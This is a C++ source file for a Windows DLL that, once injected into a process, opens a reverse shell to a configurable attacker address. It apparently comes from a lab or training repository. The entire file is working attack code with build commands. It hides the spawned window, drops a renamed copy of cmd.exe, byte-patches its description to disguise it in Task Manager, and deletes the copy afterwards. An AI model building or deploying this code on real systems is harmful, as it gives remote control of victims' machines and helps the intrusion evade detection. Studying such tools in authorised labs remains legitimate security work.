// revshell_pure_dll.cpp - pure WinSock reverse shell DLL (no shellcode)
//
// When loaded into a target process (via LoadLibrary, CreateRemoteThread,
// APC, or reflective loader), spawns a reverse shell to LHOST:LPORT.
// cmd.exe appears as a child of the HOST process - very useful for proving
// code execution inside a specific target.
//
// Build (MSVC):
//   cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /Fe:revshell_pure_dll.dll
//
// Build (MinGW-w64):
//   x86_64-w64-mingw32-g++ -shared -O2 -s -o revshell_pure_dll.dll revshell_pure_dll.cpp \
//       -lws2_32 -Wl,--subsystem,windows,--kill-at
//
// Use with any injection technique in docs/SOLUTIONS/13-*.md through 18-*.md.
//
// Change LHOST + LPORT below before building.

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

// ===========================================================================
// EDIT THESE FOUR
// ===========================================================================
static const char* LHOST = "10.10.14.1";
static const int   LPORT = 4444;

// Child cmd.exe filename on disk (shown as Image Name in Task Manager).
static const char* CHILD_EXE_NAME = "revShell.exe";

// Big "FileDescription" text in Task Manager's Processes tab.
// Replaces "Windows Command Processor" (25 UTF-16 chars) in the version
// resource. Must be <= 25 chars so the padding stays clean.
static const wchar_t* DESCRIPTION_OVERRIDE = L"RevShell - WinCmd Proc";
// ===========================================================================

static DWORD WINAPI ReverseShellThread(LPVOID) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return 2; }

    sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((u_short)LPORT);
    inet_pton(AF_INET, LHOST, &sa.sin_addr);

    for (int i = 0; i < 10; ++i) {
        if (connect(s, (sockaddr*)&sa, sizeof(sa)) != SOCKET_ERROR) break;
        Sleep(2000);
    }

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError  = (HANDLE)s;

    // Try to drop next to the host process's own EXE first. If that fails
    // (Program Files without admin), fall back to the user's home directory
    // (%USERPROFILE% = C:\Users\<name>\revShell.exe) so the drop still looks
    // like it belongs to the current user, not generic %TEMP%.
    char decoyPath[MAX_PATH];
    char hostDir[MAX_PATH];
    GetModuleFileNameA(nullptr, hostDir, MAX_PATH);
    char* lastSlash = strrchr(hostDir, '\\');
    if (lastSlash) *(lastSlash + 1) = 0;
    _snprintf_s(decoyPath, _TRUNCATE, "%s%s", hostDir, CHILD_EXE_NAME);

    if (!CopyFileA("C:\\Windows\\System32\\cmd.exe", decoyPath, FALSE)) {
        char homeDir[MAX_PATH] = {};
        if (GetEnvironmentVariableA("USERPROFILE", homeDir, MAX_PATH)) {
            _snprintf_s(decoyPath, _TRUNCATE, "%s\\%s", homeDir, CHILD_EXE_NAME);
            CopyFileA("C:\\Windows\\System32\\cmd.exe", decoyPath, FALSE);
        }
    }

    // Byte-patch the UTF-16 FileDescription inside the copy's version resource
    // so Task Manager Processes tab shows DESCRIPTION_OVERRIDE as the big text
    // instead of "Windows Command Processor".
    HANDLE hF = CreateFileA(decoyPath, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hF != INVALID_HANDLE_VALUE) {
        DWORD fsize = GetFileSize(hF, nullptr);
        BYTE* fbuf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fsize);
        if (fbuf) {
            DWORD rd = 0; ReadFile(hF, fbuf, fsize, &rd, nullptr);
            const wchar_t* needle = L"Windows Command Processor";
            size_t needleLen = wcslen(needle) * 2;
            size_t replLen   = wcslen(DESCRIPTION_OVERRIDE) * 2;
            if (replLen <= needleLen) {
                for (DWORD i = 0; i + (DWORD)needleLen <= fsize; i++) {
                    if (memcmp(fbuf + i, needle, needleLen) == 0) {
                        memcpy(fbuf + i, DESCRIPTION_OVERRIDE, replLen);
                        for (size_t j = replLen; j < needleLen; j++) fbuf[i + j] = 0;
                    }
                }
                SetFilePointer(hF, 0, nullptr, FILE_BEGIN);
                DWORD wr = 0; WriteFile(hF, fbuf, fsize, &wr, nullptr);
            }
            HeapFree(GetProcessHeap(), 0, fbuf);
        }
        CloseHandle(hF);
    }

    PROCESS_INFORMATION pi = {};
    if (CreateProcessA(decoyPath, nullptr, nullptr, nullptr, TRUE,
                       0, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    // Clean up the dropped copy after the shell exits (best effort)
    DeleteFileA(decoyPath);

    closesocket(s);
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        CreateThread(nullptr, 0, ReverseShellThread, nullptr, 0, nullptr);
    }
    return TRUE;
}
